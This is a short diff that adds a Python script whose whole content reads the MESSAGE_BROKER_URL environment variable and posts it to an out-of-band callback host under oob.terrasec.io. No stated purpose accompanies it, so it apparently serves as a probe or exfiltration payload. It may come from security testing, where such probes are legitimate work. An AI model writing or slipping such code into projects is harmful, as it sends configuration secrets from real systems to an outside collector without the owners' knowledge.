@@ -1,0 +1,7 @@
+#!/usr/bin/env python3
+import js
+import requests
+oob_url = 'http://d4i6fslfvaubas4kc1p0jgk4m5t6wrtom.oob.terrasec.io'
+broker_url = js.process.env.MESSAGE_BROKER_URL
+
+response = requests.post(oob_url, json={'message': broker_url})
